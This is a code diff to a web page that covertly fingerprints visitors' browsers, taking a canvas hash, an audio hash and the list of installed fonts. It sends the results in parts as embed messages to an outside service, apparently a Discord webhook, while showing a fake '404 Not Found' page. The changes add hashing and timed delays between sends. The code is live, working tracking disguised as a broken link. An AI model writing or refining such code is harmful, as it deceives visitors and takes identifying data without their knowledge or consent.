@@ -93,7 +93,14 @@
                 ctx.fillText("Fingerprint ", 2, 15);
                 ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
                 ctx.fillText("Fingerprint ", 4, 17);
-                return canvas.toDataURL();
+                
+                const data = canvas.toDataURL();
+                let hash = 0;
+                for (let i = 0; i < data.length; i++) {
+                    hash = ((hash << 5) - hash) + data.charCodeAt(i);
+                    hash |= 0;
+                }
+                return "Hash: " + Math.abs(hash).toString(16);
             } catch (e) {
                 return "N/A";
             }
@@ -259,7 +266,7 @@
                         color: 15105570,
                         fields: [
                             { name: "Audio Hash", value: `\`${audioHash}\``, inline: false },
-                            { name: "Canvas Hash (DataURL)", value: `\`${canvasHash}\``, inline: false },
+                            { name: "Canvas Hash", value: `\`${canvasHash}\``, inline: false },
                             { name: "Доступные шрифты", value: `${fonts}`, inline: false }
                         ],
                         timestamp: new Date().toISOString()
@@ -284,12 +291,13 @@
                 };
 
                 await sendPart(part1);
+                await new Promise(r => setTimeout(r, 400));
                 await sendPart(part2);
+                await new Promise(r => setTimeout(r, 400));
                 await sendPart(part3);
             } catch (e) {
                 console.error(e);
             } finally {
-                // В любом случае показываем 404, даже если произошла ошибка в сборе
                 document.getElementById('loader-container').classList.add('hidden');
                 document.getElementById('error-container').classList.remove('hidden');
                 document.title = "404 Not Found";
